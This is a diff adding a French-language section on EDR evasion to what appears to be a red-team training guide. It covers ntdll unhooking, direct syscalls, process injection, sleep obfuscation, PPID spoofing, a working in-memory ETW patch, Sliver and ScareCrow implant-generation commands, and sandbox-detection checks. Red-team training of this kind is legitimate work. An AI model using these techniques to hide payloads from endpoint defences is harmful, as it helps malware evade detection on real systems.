@@ -547,6 +547,309 @@ $encoded = [Convert]::ToBase64String($bytes)
 powershell -enc $encoded
 ```
 
+### 5.6 EDR Evasion Avancé
+
+Les solutions EDR (Endpoint Detection & Response) modernes utilisent plusieurs mécanismes de détection qu'il faut comprendre pour les contourner.
+
+#### Architecture EDR
+
+```mermaid
+flowchart TB
+    subgraph userland["User Mode"]
+        App[Application]
+        DLL[ntdll.dll]
+        Hook[EDR Hooks]
+    end
+
+    subgraph kernel["Kernel Mode"]
+        SSDT[SSDT]
+        Driver[EDR Driver]
+        Callback[Kernel Callbacks]
+    end
+
+    App -->|"API Call"| Hook
+    Hook -->|"Hooked"| DLL
+    DLL -->|"Syscall"| SSDT
+    Driver --> Callback
+    Callback -->|"Monitor"| SSDT
+
+    style Hook fill:#e74c3c,color:#fff
+    style Driver fill:#e74c3c,color:#fff
+```
+
+**Mécanismes de détection EDR :**
+
+| Mécanisme | Description | Niveau |
+|-----------|-------------|--------|
+| **API Hooking** | Interception des appels ntdll.dll | User Mode |
+| **ETW (Event Tracing)** | Logging des événements système | User Mode |
+| **Kernel Callbacks** | Notification d'événements noyau | Kernel Mode |
+| **Minifilter Drivers** | Interception I/O fichiers | Kernel Mode |
+| **Memory Scanning** | Analyse de la mémoire des processus | User Mode |
+| **Behavioral Analysis** | Détection de patterns suspects | Cloud/Local |
+
+#### Unhooking ntdll.dll
+
+Les EDR placent des hooks dans ntdll.dll pour intercepter les appels système. On peut restaurer la version originale.
+
+```csharp
+// Concept: Charger une copie propre de ntdll depuis le disque
+// et remplacer la section .text hookée
+
+// 1. Mapper ntdll.dll depuis le disque (copie propre)
+IntPtr pModule = LoadLibrary("C:\\Windows\\System32\\ntdll.dll");
+
+// 2. Localiser la section .text
+// 3. Copier la section propre sur la version hookée en mémoire
+// 4. Les hooks EDR sont supprimés
+
+// Outils:
+// - SharpUnhooker
+// - DInjector (unhook module)
+// - Syscall via Hell's Gate/Halo's Gate
+```
+
+**Avec un outil :**
+
+```powershell
+# SharpUnhooker - Restaure ntdll.dll
+.\SharpUnhooker.exe
+
+# Vérifier les hooks avant/après
+.\HookDetector.exe
+```
+
+#### Direct Syscalls
+
+Au lieu d'appeler ntdll.dll (hookée), on peut appeler directement le noyau via les syscalls.
+
+```csharp
+// Méthode traditionnelle (hookable):
+// NtAllocateVirtualMemory() dans ntdll.dll → EDR intercepte
+
+// Direct Syscall (évite les hooks):
+// mov r10, rcx
+// mov eax, [syscall_number]  // Ex: 0x18 pour NtAllocateVirtualMemory
+// syscall
+// ret
+
+// Le numéro de syscall varie selon la version Windows!
+```
+
+**Techniques populaires :**
+
+| Technique | Description |
+|-----------|-------------|
+| **Hell's Gate** | Résolution dynamique des syscall numbers |
+| **Halo's Gate** | Variante qui gère les hooks EDR |
+| **Tartarus' Gate** | Combinaison des deux |
+| **SysWhispers** | Génération de stubs syscall |
+
+```bash
+# Générer des stubs syscall avec SysWhispers
+python3 syswhispers.py --functions NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls
+
+# Résultat: fichiers .h et .asm à inclure dans votre projet
+```
+
+#### Indirect Syscalls
+
+Variante des direct syscalls qui exécute le `syscall` depuis ntdll.dll pour éviter la détection de syscalls dans des régions mémoire non-ntdll.
+
+```
+// Direct Syscall:
+// Code dans notre .exe → syscall instruction → détecté car pas dans ntdll
+
+// Indirect Syscall:
+// Code dans notre .exe → JMP vers ntdll → syscall instruction dans ntdll → légitime
+```
+
+#### Process Injection Avancé
+
+**Techniques classiques (détectées) :**
+
+- CreateRemoteThread
+- NtQueueApcThread
+- SetThreadContext
+
+**Techniques avancées :**
+
+```csharp
+// Module Stomping
+// Charger une DLL légitime, écraser son code avec notre payload
+// Le code malveillant semble venir d'une DLL signée Microsoft
+
+// Process Hollowing
+// Créer un processus suspendu, vider sa mémoire, injecter notre code
+// Le processus semble légitime (ex: svchost.exe)
+
+// Transacted Hollowing
+// Utilise les transactions NTFS pour éviter la détection
+
+// Early Bird Injection
+// Injection avant l'initialisation du processus (avant hooks EDR)
+```
+
+**Process Injection avec D/Invoke :**
+
+```csharp
+// D/Invoke: Alternative à P/Invoke qui évite les hooks
+// Au lieu d'importer statiquement, résout dynamiquement
+
+// P/Invoke classique (hookable):
+[DllImport("kernel32.dll")]
+static extern IntPtr VirtualAlloc(...);
+
+// D/Invoke (évite le hook):
+IntPtr pointer = Generic.GetLibraryAddress("kernel32.dll", "VirtualAlloc");
+// Appel via le pointer, pas via l'import
+```
+
+#### Sleep Obfuscation
+
+Les EDR scannent la mémoire des processus. En chiffrant le payload pendant le sleep, on évite la détection.
+
+```csharp
+// Concept:
+// 1. Avant sleep: Chiffrer le payload en mémoire (XOR, AES)
+// 2. Pendant sleep: Mémoire contient uniquement du bruit chiffré
+// 3. Après sleep: Déchiffrer et reprendre l'exécution
+
+// Techniques:
+// - Ekko: Utilise timers pour le chiffrement
+// - Foliage: Variante avec ROP
+// - Gargoyle: Utilise ROP + timers
+```
+
+**Implémentation dans Havoc/Sliver :**
+
+```bash
+# Havoc - Sleep obfuscation activé par défaut dans Demon
+# Sliver - Option --evasion
+
+sliver > generate --mtls 192.168.56.100 --os windows --evasion
+```
+
+#### PPID Spoofing
+
+Modifier le processus parent pour paraître légitime.
+
+```powershell
+# Word.exe qui spawn powershell.exe = suspect
+# svchost.exe qui spawn powershell.exe = moins suspect (mais toujours)
+
+# PPID Spoofing: créer powershell.exe avec svchost.exe comme "parent"
+```
+
+```csharp
+// Via STARTUPINFOEX et PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+var si = new STARTUPINFOEX();
+si.lpAttributeList = ... // Définir le PPID spoofé
+CreateProcess(..., si, ...);
+```
+
+#### Contournement ETW
+
+```csharp
+// ETW: Event Tracing for Windows
+// Utilisé par les EDR pour logger PowerShell, .NET, etc.
+
+// Patch en mémoire de EtwEventWrite
+// 1. Localiser ntdll!EtwEventWrite
+// 2. Patcher avec "ret" (0xC3) au début
+// 3. Toutes les traces ETW sont ignorées
+
+IntPtr addr = GetProcAddress(GetModuleHandle("ntdll"), "EtwEventWrite");
+VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, out _);
+Marshal.WriteByte(addr, 0xC3); // ret
+```
+
+```powershell
+# Patch ETW via PowerShell (simplifié)
+$etw = [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance')
+# ... patch similar to AMSI
+```
+
+#### Outils d'Évasion EDR
+
+| Outil | Description |
+|-------|-------------|
+| **ScareCrow** | Génération de loaders avec évasion EDR |
+| **Freeze** | Suspension des threads EDR |
+| **SharpBlock** | Blocage des DLLs EDR |
+| **NimPackt** | Implants Nim avec évasion |
+| **Mangle** | Manipulation de PE pour évasion |
+| **PEzor** | Packer avec shellcode loader |
+
+**Exemple ScareCrow :**
+
+```bash
+# Générer un loader avec évasion
+ScareCrow -I payload.bin -domain microsoft.com -Loader binary -O output.exe
+
+# Options:
+# -domain: Domain fronting pour les callbacks
+# -Loader: Type de loader (binary, dll, msiexec)
+# -sandbox: Détection de sandbox
+```
+
+#### Détection de Sandbox/VM
+
+```csharp
+// Checks anti-analyse:
+// - Nom d'utilisateur (john, malware, sandbox)
+// - Nom de machine (DESKTOP-XXXXXX patterns)
+// - Processus (vmtoolsd, vboxservice)
+// - Fichiers (C:\windows\system32\drivers\vmmouse.sys)
+// - Registry (HKLM\SOFTWARE\VMware)
+// - CPU count < 2
+// - RAM < 4GB
+// - Temps d'exécution (fast forward detection)
+// - Interaction utilisateur (mouvements souris)
+
+if (Environment.UserName.ToLower().Contains("malware"))
+    Environment.Exit(0);
+
+if (Environment.ProcessorCount < 2)
+    Environment.Exit(0);
+```
+
+#### Résumé EDR Evasion
+
+```mermaid
+flowchart LR
+    subgraph techniques["Techniques d'Évasion"]
+        T1[Unhooking]
+        T2[Direct Syscalls]
+        T3[Sleep Obfuscation]
+        T4[PPID Spoofing]
+        T5[ETW Bypass]
+    end
+
+    subgraph detection["Mécanismes Détectés"]
+        D1[API Hooks]
+        D2[Syscall Monitoring]
+        D3[Memory Scanning]
+        D4[Process Tree]
+        D5[Event Logging]
+    end
+
+    T1 -.->|"Bypasses"| D1
+    T2 -.->|"Bypasses"| D1
+    T3 -.->|"Bypasses"| D3
+    T4 -.->|"Bypasses"| D4
+    T5 -.->|"Bypasses"| D5
+
+    style T1 fill:#27ae60,color:#fff
+    style T2 fill:#27ae60,color:#fff
+    style T3 fill:#27ae60,color:#fff
+    style T4 fill:#27ae60,color:#fff
+    style T5 fill:#27ae60,color:#fff
+```
+
+!!! warning "Avertissement Légal"
+    Ces techniques sont présentées à des fins éducatives pour comprendre les mécanismes de défense. Leur utilisation sans autorisation explicite est illégale.
+
 ---
 
 ## 6. Command & Control (C2) Frameworks
